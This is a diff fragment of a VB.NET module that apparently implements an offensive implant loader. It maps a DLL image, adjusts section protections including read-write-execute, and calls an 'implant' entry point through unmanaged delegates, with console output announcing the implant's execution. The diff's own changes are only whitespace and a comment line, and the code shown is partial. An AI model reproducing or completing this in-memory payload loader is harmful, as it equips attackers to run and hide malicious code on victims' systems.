@@ -217,6 +217,7 @@ Module Module1
             End If
         End If
     End Sub
+    
     Private Function map_dll_image(ByVal dll_name As String) As IntPtr
         Dim hFile As IntPtr = CreateFileA(dll_name, GENERIC_READ, 0, Nothing, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, Nothing)
         If hFile = IntPtr.Zero Then
@@ -264,8 +265,8 @@ Module Module1
         If Not set_sections_access(mapped, implant_dll, implant_size) Then
             Return False
         End If
-
     End Function
+    
     Private Function set_sections_access(ByVal mapped As IntPtr, ByRef implant_dll As IntPtr, ByVal implant_size As UInteger) As Boolean
         Dim oldProtect As UInteger = 0
         ' protect PE header
@@ -285,6 +286,7 @@ Module Module1
         Next i
         Return True
     End Function
+    
     Private Function translate_protect(ByVal sec_charact As UInteger) As UInteger
         If (sec_charact And IMAGE_SCN_MEM_EXECUTE) <> 0 AndAlso (sec_charact And IMAGE_SCN_MEM_READ) <> 0 AndAlso (sec_charact And IMAGE_SCN_MEM_WRITE) <> 0 Then
             Return PAGE_EXECUTE_READWRITE
@@ -304,6 +306,7 @@ Module Module1
         End If
         Return PAGE_READWRITE
     End Function
+    
     Private Sub run_implant(ByVal mapped As Object, ByVal ep_rva As UInteger, ByVal is_dll As Boolean)
         Dim implant_ep As IntPtr = DirectCast(mapped, IntPtr) + ep_rva
         Console.Write("[*] Executing Implant's Entry Point: ")
@@ -319,6 +322,8 @@ Module Module1
             exe_main()
         End If
     End Sub
+    
+    '==================================================================================================================
     <UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet:=CharSet.Unicode)>
     Public Delegate Function dll_mainDelegate(ByVal HINSTANCE As IntPtr, ByVal DWORD As UInteger, ByVal LPVOID As IntPtr) As Boolean
     <UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet:=CharSet.Unicode)>
